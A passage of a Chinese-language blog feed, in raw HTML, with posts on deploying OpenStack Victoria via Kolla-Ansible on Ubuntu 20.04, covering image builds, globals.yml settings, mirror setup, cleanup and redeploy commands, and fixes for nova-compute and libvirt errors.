class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码构建 Keystone 镜像</span></span><br><span class="line">kolla-build -t <span class="built_in">source</span> --config-file /etc/kolla/kolla-build.conf keystone &amp;&gt; keystone-build.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出镜像</span></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地仓库</span></span><br><span class="line">curl -X GET 10.1.0.240:4000/v2/_catalog</span><br></pre></td></tr></table></figure><p>构建完毕后，使用新镜像更新当前环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kolla-ansible upgrade</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>kolla-ansible 相关操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除容器</span></span><br><span class="line">kolla-ansible/tools/cleanup-containers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有镜像</span></span><br><span class="line">kolla-ansible/tools/cleanup-images --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">kolla-ansible pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新环境</span></span><br><span class="line">kolla-ansible upgrade</span><br></pre></td></tr></table></figure><p>相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dockerfile 相关</span></span><br><span class="line">~/kolla/docker  <span class="comment"># jinjia2 模板文件</span></span><br><span class="line">/etc/kolla      <span class="comment"># 镜像配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">/etc/kolla/kolla-build.conf</span><br><span class="line">/etc/kolla/globals.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志文件</span></span><br><span class="line">/var/<span class="built_in">log</span>/kolla/ <span class="comment"># 链接 /var/lib/docker/volumes/kolla_logs/_data/</span></span><br></pre></td></tr></table></figure><p>清除容器重新部署，通常不用 <code>./kolla-ansibletools/cleanup-host</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./kolla-ansible/tools/cleanup-containers</span><br><span class="line">kolla-ansible -i ./all-in-one prechecks</span><br><span class="line">kolla-ansible -i ./all-in-one deploy</span><br><span class="line">kolla-ansible post-deploy</span><br></pre></td></tr></table></figure><h1 id="问题与解决"><a href="#问题与解决" class="headerlink" title="问题与解决"></a>问题与解决</h1><h2 id="nova-compute-注册失败"><a href="#nova-compute-注册失败" class="headerlink" title="nova-compute 注册失败"></a>nova-compute 注册失败</h2><p>查看日志信息说是连接不上 libvirt</p><img src="https://i.loli.net/2021/06/15/Pknj9uaUCoq2bgI.jpg"><p>配置并重启 libvirt</p><ul><li><a href="https://askubuntu.com/questions/423425/i-cant-use-libvirt-with-listen-tcp/610350#610350">I can’t use libvirt with listen TCP</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/libvirt/libvirtd.conf</span><br><span class="line"><span class="comment">#listen_tls = 0</span></span><br><span class="line"><span class="comment">#listen_tcp = 1</span></span><br><span class="line"><span class="comment">#auth_tcp = &quot;none&quot;</span></span><br><span class="line"><span class="comment">#tcp_port = &quot;16509&quot;</span></span><br><span class="line"></span><br><span class="line">systemctl restart libvirtd</span><br><span class="line"><span class="comment">#sudo chmod -R 777 /var/run/libvirt</span></span><br><span class="line"></span><br><span class="line">ps aux | grep libvirtd</span><br></pre></td></tr></table></figure><p>重新部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除容器</span></span><br><span class="line">kolla-ansible/tools/cleanup-containers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署</span></span><br><span class="line">kolla-ansible -i ./all-in-one deploy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新生成认证文件</span></span><br><span class="line">kolla-ansible post-deploy</span><br></pre></td></tr></table></figure><p>不安装和配置 libvirt，且 /etc/kolla/globals.yml 也不配置 <code>nova_compute_virt_type</code> 也能正常执行。</p><p>安装完毕后注释该配置，重新 upgrade 正常，不注释貌似也行（玄学）。</p><p>官方指出，由于技术原因，配置 qemu 后使用 <code>kolla-ansible upgrade</code> 可能出错。</p><ul><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/operating-kolla.html">Operating Kolla</a></li></ul><h2 id="数据库迁移出错"><a href="#数据库迁移出错" class="headerlink" title="数据库迁移出错"></a>数据库迁移出错</h2><p>尝试多次无果，回退快照后执行 <code>kolla-ansible upgrade</code> 没有遇到该问题，清除后重新部署应该也可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR keystone migrate.exceptions.InvalidRepositoryError: &#x2F;var&#x2F;lib&#x2F;kolla&#x2F;venv&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;keystone&#x2F;common&#x2F;sql&#x2F;migrate_repo</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/06/15/AC5EoBvLWgfnIml.jpg"><h2 id="请求超时"><a href="#请求超时" class="headerlink" title="请求超时"></a>请求超时</h2><p>再次执行 <code>kolla-ansible upgrade</code> 没有再遇到该问题。实验过程中发现时不时就会请求超时，通常就重复执行指令，再不行就清除后重新部署。</p><img src="https://i.loli.net/2021/06/15/LZuw58IqzsJQ6cA.jpg"><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/multinode.html">Multinode Deployment of Kolla - Option 1: local registry</a></li><li><a href="https://docs.docker.com/registry/">Docker Registry</a></li><li><a href="https://askubuntu.com/questions/420981/how-do-i-save-terminal-output-to-a-file">How do I save terminal output to a file?</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/operating-kolla.html">Operating Kolla</a></li><li><a href="https://docs.openstack.org/kolla/ussuri/admin/image-building.html">Building Container Images</a></li></ul>]]></content>
    
    
    <summary type="html">Ubuntu 20.04 + OpenStack (Victoria)</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack 单机部署 —— Kolla-Ansible</title>
    <link href="https://jckling.github.io/2021/05/31/OpenStack/OpenStack%20%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%20%E2%80%94%E2%80%94%20Kolla-Ansible/"/>
    <id>https://jckling.github.io/2021/05/31/OpenStack/OpenStack%20%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%20%E2%80%94%E2%80%94%20Kolla-Ansible/</id>
    <published>2021-05-31T11:02:50.000Z</published>
    <updated>2021-07-08T08:27:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>Kolla-Ansible 只支持列表 <a href="https://docs.openstack.org/kolla-ansible/latest/user/support-matrix">Supported Operating Systems</a> 中的操作系统，这里选用 Ubuntu 20.04 。</p><p>主机配置</p><ul><li>CPU：4 Cores</li><li>内存：16 GB</li><li>硬盘：512 GB</li><li>网卡：<ul><li>NAT-Network</li><li>未指定</li></ul></li></ul><h2 id="更换-pip-源（可选）"><a href="#更换-pip-源（可选）" class="headerlink" title="更换 pip 源（可选）"></a>更换 pip 源（可选）</h2><p>在用户根目录创建文件夹 <code>.pip</code> ，添加配置文件 <code>pip.conf</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">cd</span> &amp;&amp; mkdir .pip &amp;&amp; <span class="built_in">cd</span> .pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并编辑配置文件</span></span><br><span class="line">sudo vim pip.conf</span><br></pre></td></tr></table></figure><p>pip 源配置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 6000</span><br><span class="line">index-url &#x3D; http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">trusted-host &#x3D; mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h2 id="更换-Ubuntu-源（可选）"><a href="#更换-Ubuntu-源（可选）" class="headerlink" title="更换 Ubuntu 源（可选）"></a>更换 Ubuntu 源（可选）</h2><p>备份源文件，再替换成清华的镜像源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置镜像源</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级</span></span><br><span class="line">sudo apt dist-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>镜像源设置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line"># deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Python 构建依赖</span></span><br><span class="line">sudo apt install python3-dev libffi-dev gcc libssl-dev -y</span><br></pre></td></tr></table></figure><p>安装 <code>venv</code>，创建并使用虚拟环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv /home/jck/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> /home/jck/code/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Ansible</span></span><br><span class="line">pip install -U pip</span><br><span class="line">pip install <span class="string">&#x27;ansible&lt;3.0&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="部署-OpenStack"><a href="#部署-OpenStack" class="headerlink" title="部署 OpenStack"></a>部署 OpenStack</h1><h2 id="安装-Kolla-Ansible"><a href="#安装-Kolla-Ansible" class="headerlink" title="安装 Kolla-Ansible"></a>安装 Kolla-Ansible</h2><p>使用 git 克隆仓库，<code>-b</code> 参数指定版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/kolla -b stable/victoria</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/kolla-ansible -b stable/victoria</span><br></pre></td></tr></table></figure><p>在虚拟环境中安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip install ./kolla</span><br><span class="line">pip install ./kolla-ansible</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line">sudo mkdir -p /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># 权限设置</span></span><br><span class="line">sudo chown <span class="variable">$USER</span>:<span class="variable">$USER</span> /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置文件</span></span><br><span class="line">cp -r kolla-ansible/etc/kolla/* /etc/kolla</span><br><span class="line">cp kolla-ansible/ansible/inventory/* .</span><br></pre></td></tr></table></figure><h2 id="配置-Ansible"><a href="#配置-Ansible" class="headerlink" title="配置 Ansible"></a>配置 Ansible</h2><p>创建并编辑 Ansible 配置文件 ansible.cfg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建</span></span><br><span class="line">sudo touch /etc/ansible/ansible.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑</span></span><br><span class="line">sudo vim /etc/ansible/ansible.cfg</span><br></pre></td></tr></table></figure><p>添加以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">host_key_checking&#x3D;False</span><br><span class="line">pipelining&#x3D;True</span><br><span class="line">forks&#x3D;100</span><br></pre></td></tr></table></figure><h2 id="准备初始配置"><a href="#准备初始配置" class="headerlink" title="准备初始配置"></a>准备初始配置</h2><h3 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h3><p>两个示例文件：all-in-one 和 multinode，单机部署不需要做额外的修改。</p><h3 id="Kolla-密码"><a href="#Kolla-密码" class="headerlink" title="Kolla 密码"></a>Kolla 密码</h3><p>部署过程中使用的密码存储在 <code>/etc/kolla/passwords.yml</code> 文件，初始为空白，需要手动设置或随机生成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> kolla-ansible/tools</span><br><span class="line">./generate_passwords.py</span><br></pre></td></tr></table></figure><h3 id="Kolla-globals-yml"><a href="#Kolla-globals-yml" class="headerlink" title="Kolla globals.yml"></a>Kolla globals.yml</h3><p><code>globals.yml</code> 是 Kolla-Ansible 的主要配置文件，以下选项需要进行配置：</p><ul><li>Image options：指定用于部署的镜像，支持 <code>centos</code>、<code>ubuntu</code>、<code>debian</code>、<code>rhel</code><ul><li>type：只影响 OpenStack 服务<ul><li><code>binary</code>：使用存储仓库，例如 apt 或 dnf；基础设施服务通常使用这个选项</li><li><code>source</code>：使用原始源存档，例如 git 仓库或本地源目录；比 <code>binary</code> 稍微可靠些</li></ul></li></ul></li><li>Networking：网络配置<ul><li><code>network_interface</code>：管理网络</li><li><code>external_interface</code>：Neutron 外部网络，没有 ip 的网卡</li><li><code>internal_vip_address</code>：浮动 IP 范围，与管理网络同网段</li></ul></li><li>Enable additional services：安装额外的服务组件<ul><li>例如，<code>enable_cinder: &quot;yes&quot;</code> 表示启用块存储服务，支持的服务参见 <a href="https://github.com/openstack/kolla-ansible/blob/master/README.rst#openstack-services">a list of available services</a></li></ul></li><li>Multiple globals files：使用额外的配置文件启用服务，在 <code>etc/kolla/globals.d</code> 目录下创建</li><li>Virtual environment：建议在远程主机上使用虚拟环境执行</li></ul><p>编辑配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/kolla/globals.yml</span><br></pre></td></tr></table></figure><p>配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 操作系统</span></span><br><span class="line"><span class="attr">kolla_base_distro:</span> <span class="string">&quot;ubuntu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装方式</span></span><br><span class="line"><span class="attr">kolla_install_type:</span> <span class="string">&quot;source&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络</span></span><br><span class="line"><span class="attr">kolla_internal_vip_address:</span> <span class="string">&quot;10.1.0.250&quot;</span> <span class="comment"># network_interface 同网段</span></span><br><span class="line"></span><br><span class="line"><span class="attr">network_interface:</span> <span class="string">&quot;ens192&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">neutron_external_interface:</span> <span class="string">&quot;ens160&quot;</span> <span class="comment"># 空闲网卡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#enable_cinder: &quot;yes&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#enable_cinder_backend_nfs: &quot;yes&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算</span></span><br><span class="line"><span class="attr">nova_compute_virt_type:</span> <span class="string">&quot;qemu&quot;</span></span><br></pre></td></tr></table></figure><p>因为不支持虚拟化，所以配置为 <code>qemu</code> <del>，需要额外安装 libvirt</del>（应该不用装）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 libvirt</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-kvm libvirt-daemon-system -y</span><br></pre></td></tr></table></figure><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>配置文件准备完毕后即可进行部署，首先进行基础的主机级依赖设置，Kolla-Ansible 提供了一个安装所有必需服务的 playbook</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据 Kolla 部署依赖创建服务器</span></span><br><span class="line">kolla-ansible -i all-in-one bootstrap-servers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署前检查主机</span></span><br><span class="line">kolla-ansible -i all-in-one prechecks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署 OpenStack</span></span><br><span class="line">kolla-ansible -i all-in-one deploy</span><br></pre></td></tr></table></figure><h2 id="使用-OpenStack"><a href="#使用-OpenStack" class="headerlink" title="使用 OpenStack"></a>使用 OpenStack</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 OpenStack CLI 客户端</span></span><br><span class="line">pip install python-openstackclient</span><br></pre></td></tr></table></figure><p>OpenStack 需要 openrc 文件，其中设置了 admin 用户的凭据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成 openrc 文件</span></span><br><span class="line">kolla-ansible post-deploy</span><br><span class="line">. /etc/kolla/admin-openrc.sh</span><br></pre></td></tr></table></figure><p>执行脚本生成示例网络、镜像、实例等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code/share/kolla-ansible/init-runonce</span><br></pre></td></tr></table></figure><p>创建实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip install python-openstackclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实例</span></span><br><span class="line">openstack server create \</span><br><span class="line">    --image cirros \</span><br><span class="line">    --flavor m1.tiny \</span><br><span class="line">    --network demo-net \</span><br><span class="line">    demo1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认实例状态</span></span><br><span class="line">openstack server list</span><br></pre></td></tr></table></figure><p>访问 ip 地址可进入 horizon 登录界面</p><ul><li>用户名：<code>admin</code></li><li>密码：查看 <code>/etc/kolla/passwords.yml</code></li></ul><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/support-matrix.html">Support Matrix</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/quickstart.html">OpenStack Docs: Quick Start</a></li></ul>]]></content>
    
    
    <summary type="html">Ubuntu 20.04 + OpenStack (Victoria)</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 20.04 计算节点源码安装 nova-compute (Victoria)</title>
    <link href="https://jckling.github.io/2021/05/31/OpenStack/Ubuntu20.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20nova-compute%20(Victoria)/"/>
    <id>https://jckling.github.io/2021/05/31/OpenStack/Ubuntu20.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20nova-compute%20(Victoria)/</id>
    <published>2021-05-31T07:52:19.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>由于安装的是 Victoria 版本，计算节点要使用 Ubuntu 20.04 。</p><p>Ubuntu 18.04 控制节点</p><ul><li>2 处理器</li><li>4 GB 内存</li><li>100 GB 硬盘</li></ul><p>Ubuntu 20.04 计算节点</p><ul><li>2 处理器</li><li>4 GB 内存</li><li>100 GB 硬盘</li></ul><p>各使用两块网卡</p><ul><li>NAT Network 虚拟机组网</li><li>Host-Only 宿主机 ssh 连接</li></ul><img src="https://i.loli.net/2021/06/06/8n3hsxDb4LKXOdf.png" width="60%"/><p>修改主机名称，控制节点 <code>controller</code>、计算节点 <code>compute</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hostnamectl set-hostname controller</span><br></pre></td></tr></table></figure><p>配置静态 ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/netplan/00-installer-config.yaml</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure><p>配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is the network config written by &#x27;subiquity&#x27;</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">enp0s3:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="number">10.0</span><span class="number">.2</span><span class="number">.28</span><span class="string">/24</span>]</span><br><span class="line">      <span class="attr">gateway4:</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line">      <span class="attr">nameservers:</span></span><br><span class="line">        <span class="attr">addresses:</span> [<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>]</span><br><span class="line">    <span class="attr">enp0s8:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="number">192.168</span><span class="number">.56</span><span class="number">.115</span><span class="string">/24</span>]</span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">to:</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span><span class="string">/24</span></span><br><span class="line">        <span class="attr">via:</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span></span><br><span class="line">        <span class="attr">metric:</span> <span class="number">100</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>修改 hosts 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.2.28 controller</span></span><br><span class="line"><span class="comment"># 10.0.2.29 compute</span></span><br></pre></td></tr></table></figure><p>每个主机的用户都是 jck ，最后的网络配置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 控制节点</span></span><br><span class="line">10.0.2.28</span><br><span class="line">192.168.56.115</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算节点</span></span><br><span class="line">10.0.2.29</span><br><span class="line">192.168.56.116</span><br></pre></td></tr></table></figure><h1 id="控制节点"><a href="#控制节点" class="headerlink" title="控制节点"></a>控制节点</h1><h2 id="Keystone"><a href="#Keystone" class="headerlink" title="Keystone"></a>Keystone</h2><figure class="highlight bash"><table><tr><td 